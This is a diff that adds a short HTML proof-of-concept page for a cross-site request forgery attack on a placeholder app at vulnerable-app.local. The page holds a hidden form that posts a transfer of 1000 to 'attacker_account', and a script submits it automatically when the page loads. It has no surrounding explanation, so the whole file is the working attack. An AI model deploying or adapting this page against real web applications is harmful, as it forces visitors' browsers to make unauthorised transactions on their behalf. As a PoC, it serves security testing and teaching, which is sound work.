@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack PoC</title>
+</head>
+<body>
+  <h2>CSRF Proof of Concept</h2>
+  <form action="http://vulnerable-app.local/transfer-money" method="POST" id="csrfForm">
+    <input type="hidden" name="amount" value="1000">
+    <input type="hidden" name="to_account" value="attacker_account">
+    <!-- No CSRF token included -->
+  </form>
+  <script>
+    // Auto-submit the form when the page loads
+    window.onload = function() {
+      document.getElementById('csrfForm').submit();
+    };
+  </script>
+</body>
+</html>
